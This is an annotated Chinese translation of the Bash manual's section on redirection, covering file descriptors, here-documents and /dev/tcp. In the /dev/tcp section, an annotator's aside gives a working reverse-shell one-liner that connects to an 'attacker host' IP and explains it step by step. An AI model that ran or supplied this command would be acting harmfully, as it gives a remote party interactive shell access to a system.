# 3.6 重定向

https://www.gnu.org/software/bash/manual/html_node/Redirections.html

在命令执行之前，可以使用由 shell 解释的特殊记法对其输入和输出进行重定向。重定向允许复制、打开、关闭命令的文件句柄，使其引用不同文件，并且可以更改命令读取和写入的文件。与 `exec` 内建命令一起使用时，重定向会修改当前 shell 执行环境中的文件句柄。以下重定向运算符可以出现在*简单命令*之前、其中任意位置，或跟在*命令*之后（重定向符仅能够放置在复合命令之后）。重定向按它们出现的顺序从左到右处理。

```sh
# 复合命令，无效语句
<<END while read LINE; do echo "$LINE"; sleep 0.1; done 
END

# 复合命令，有效语句
while read LINE; do echo "$LINE"; sleep 0.1; done <<END
END
```

> `exec {d}</` 重定向根目录，将自动分配的 fd 保存到变量 `$d`

每个前面可带文件描述符编号的重定向，也可以改为前面带一个形式为 `{varname}` 的词。在这种情况下，对于除 `>&-` 和 `<&-` 之外的每个重定向运算符，shell 会分配一个大于或等于 10 的文件描述符，并将其赋值给 `{varname}`。如果 `{varname}` 出现在 `>&-` 或 `<&-` 之前，则 `varname` 的值定义要关闭的文件描述符。如果提供了 `{varname}`，该重定向会在命令作用域之外持续存在，这允许 shell 程序员无需使用 `exec` 内建命令即可手动管理文件描述符的生命周期。`varredir_close` shell 选项管理此行为（参见 [Shopt 内建命令]）。

在以下描述中，如果省略文件描述符编号，并且重定向运算符的第一个字符是 `<`，则该重定向指标准输入（文件描述符 0）。如果重定向运算符的第一个字符是 `>`，则该重定向指标准输出（文件描述符 1）。
> 默认重定向描述符出处

在以下描述中，重定向运算符后面的 `word`，除非另有说明，会经历大括号扩展、波浪号扩展、参数和变量扩展、命令替换、算术扩展、引号移除、文件名扩展和单词拆分。如果它扩展为多个单词，Bash 会报告错误。

重定向的顺序很重要。例如，命令

```bash
ls > dirlist 2>&1
```

将标准输出（文件描述符 1）和标准错误（文件描述符 2）都定向到文件 `dirlist`，而命令

```bash
ls 2>&1 > dirlist
```

仅将标准输出定向到文件 `dirlist`，因为在标准输出被重定向到 `dirlist` 之前，标准错误已经被复制为标准输出的副本。

当在重定向中使用时，Bash 会特殊处理几个文件名，如下表所述。如果运行 Bash 的操作系统提供这些特殊文件，Bash 会使用它们；否则 Bash 会在内部模拟它们，行为如下所述。

- `/dev/fd/fd`
  如果 `fd` 是有效整数，则复制文件描述符 `fd`。
- `/dev/stdin`
  复制文件描述符 0。
- `/dev/stdout`
  复制文件描述符 1。
- `/dev/stderr`
  复制文件描述符 2。
- `/dev/tcp/host/port` 🥷
  如果 `host` 是有效主机名或 Internet 地址，且 `port` 是整数端口号或服务名，Bash 会尝试打开相应的 TCP 套接字。
  > 无网络工具带外
- `/dev/udp/host/port`
  如果 `host` 是有效主机名或 Internet 地址，且 `port` 是整数端口号或服务名，Bash 会尝试打开相应的 UDP 套接字。

打开或创建文件失败会导致重定向失败。

使用大于 9 的文件描述符进行重定向时应谨慎，因为它们可能与 shell 内部使用的文件描述符冲突。

反向 shell
- 命令
  ```sh
  exec 196<>/dev/tcp/192.168.38.133/1331; sh <&196 >&196 2>&196
  ```
  1. 打开到攻击者主机 `192.168.38.133:1331` 的读写 tcp 连接到文件描述符196
  2. 将 shell 的 stdin/stdout/stderr 重定向到此 tcp 连接

## 3.6.1 重定向输入

重定向输入会打开名称由 `word` 扩展结果得到的文件，用于在文件描述符 `n` 上读取；如果未指定 `n`，则在标准输入（文件描述符 0）上读取。
> 即
> - `命令 < 文件` 命令读取文件内容
> - `< 文件 命令` 标准输入读取文件内容后，传递到命令

重定向输入的一般格式为：

```bash
[n]<word
```

## 3.6.2 重定向输出

重定向输出会打开名称由 `word` 扩展结果得到的文件，用于在文件描述符 `n` 上写入；如果未指定 `n`，则在标准输出（文件描述符 1）上写入。如果文件不存在，则创建它；如果文件已存在，则将其截断为零长度。

重定向输出的一般格式为：

```bash
[n]>[|]word
```

- 如果重定向运算符是 `>`，并且 `set` 内建命令的 `noclobber` 选项已启用，那么当 `word` 扩展结果所命名的文件存在且是常规文件时，重定向失败。

- 如果重定向运算符是 `>|`，或者重定向运算符是 `>` 且 `set` 内建命令的 `noclobber` 选项未启用，则即使 `word` 命名的文件存在，Bash 也会尝试重定向。
    > 即，此时 `>` 将重定向的数据覆盖写入文件。如果指定的文件不存在，则创建。  
    > - 权限为 `rw-rw-rw-` (`0666`)

示例
```sh
# 重定向 stderr 到黑洞，丢弃错误信息
2>/dev/null
```

```sh
if ! 命令 >/dev/null 2>&1; then
```
- 将命令的标准输出重定向到黑洞丢弃，将标准错误重定向到标准输出（当前为黑洞丢弃）
- 使用命令的返回状态码进行判断

## 3.6.3 追加重定向输出

以这种方式重定向输出会打开名称由 `word` 扩展结果得到的文件，用于在文件描述符 `n` 上追加；如果未指定 `n`，则在标准输出（文件描述符 1）上追加。如果文件不存在，则创建它。

追加输出的一般格式为：

```bash
[n]>>word
```

## 3.6.4 重定向标准输出和标准错误

此构造将标准输出（文件描述符 1）和标准错误输出（文件描述符 2）都重定向到名称由 `word` 扩展结果得到的文件。

重定向标准输出和标准错误有两种格式：

```bash
&>word
```

以及

```bash
>&word
```

两种形式中，第一种是首选。它在语义上等价于

```bash
>word 2>&1
```

使用第二种形式时，`word` 不能扩展为数字或 `-`。如果它确实如此，出于兼容性原因，会应用其他重定向运算符（参见下面的复制文件描述符）。

## 3.6.5 追加标准输出和标准错误

此构造将标准输出（文件描述符 1）和标准错误输出（文件描述符 2）都追加到名称由 `word` 扩展结果得到的文件。

追加标准输出和标准错误的格式为：

```bash
&>>word
```

这在语义上等价于

```bash
>>word 2>&1
```

（参见下面的复制文件描述符）。

## 3.6.6 Here 文档 —— 使用定界符标记的无引号字符串

这种类型的重定向指示 shell 从当前源读取输入，直到读取到仅包含 `delimiter` 的一行（没有尾随空白）。在此之前的全部行随后成为某个命令的标准输入（如果指定了 `n`，则为文件描述符 `n`）。

Here 文档的格式为：

```bash
[n]<<[-]word
        here-document
delimiter
```

```sh
命令 << 自定义结束符
	文档内容
自定义结束符
```

shell 不会对 `word` 执行参数和变量扩展、命令替换、算术扩展或文件名扩展。

如果 `word` 的任何部分被引用，则 `delimiter` 是对 `word` 进行引号移除后的结果，并且 here-document 中的行不会扩展。如果 `word` 未被引用，则 `delimiter` 就是 `word` 本身，here-document 文本的处理类似于双引号字符串：here-document 的所有行都会经历参数扩展、命令替换和算术扩展，字符序列 `\newline` 按字面处理，并且必须使用 `\` 来引用字符 `\`、`$` 和反引号；不过，双引号字符没有特殊含义。

如果重定向运算符是 `<<-`，则 shell 会从输入行以及包含 `delimiter` 的行中去除前导制表符。这允许 shell 脚本中的 here-document 以自然方式缩进。

如果 delimiter 未被引用，则 `\<newline>` 序列被视为行延续：两行会合并，并且反斜杠-换行会被移除。这发生在读取 here-document 时、检查结束 delimiter 之前，因此合并后的行可以构成结束 delimiter。

示例

```sh
cat <<END | while read LINE; do echo "$LINE"; sleep 0.1; done
END

while read LINE; do echo "$LINE"; sleep 0.1; done <<END
END
```

## 3.6.7 Here 字符串

Here 文档的一种变体，格式为：

```bash
[n]<<< word
```

```sh
# 末尾包含换行符
命令 <<< '字符串'
``` 

`word` 会经历波浪号扩展、参数和变量扩展、命令替换、算术扩展和引号移除。不执行文件名扩展和单词拆分。结果作为单个字符串提供给命令，并附加一个换行符，作为其标准输入（如果指定了 `n`，则为文件描述符 `n`）。

## 3.6.8 复制文件描述符

重定向运算符

```bash
[n]<&word
```

用于复制输入文件描述符。如果 `word` 扩展为一个或多个数字，则文件描述符 `n` 被制作为该文件描述符的副本。如果 `word` 中的数字未指定一个为输入打开的文件描述符，则属于重定向错误。如果 `word` 求值为 `-`，则关闭文件描述符 `n`。如果未指定 `n`，则使用标准输入（文件描述符 0）。（`n` 复制 `word` 的输入文件描述符）

运算符

```bash
[n]>&word
```

类似地用于复制输出文件描述符。如果未指定 `n`，则使用标准输出（文件描述符 1）。如果 `word` 中的数字未指定一个为输出打开的文件描述符，则属于重定向错误。如果 `word` 求值为 `-`，则关闭文件描述符 `n`。作为特殊情况，如果省略 `n`，且 `word` 不扩展为一个或多个数字或 `-`，则如前所述重定向标准输出和标准错误。（`n` 复制 `word` 的输出文件描述符）

```sh
# fd2 复制 fd1 的输出文件描述符，此时 fd2 与 fd1 指向相同文件
2>&1
```

## 3.6.9 移动文件描述符

重定向运算符

```bash
[n]<&digit-
```

将文件描述符 `digit` 移动到文件描述符 `n`；如果未指定 `n`，则移动到标准输入（文件描述符 0）。`digit` 在复制到 `n` 后关闭。

类似地，重定向运算符

```bash
[n]>&digit-
```

将文件描述符 `digit` 移动到文件描述符 `n`；如果未指定 `n`，则移动到标准输出（文件描述符 1）。

## 3.6.10 打开用于读写的文件描述符

重定向运算符

```bash
[n]<>word
```

打开名称由 `word` 扩展结果得到的文件，用于在文件描述符 `n` 上读写；如果未指定 `n`，则在文件描述符 0 上读写。如果文件不存在，则创建它。（`n` 得到 `word` 的读写文件描述符）
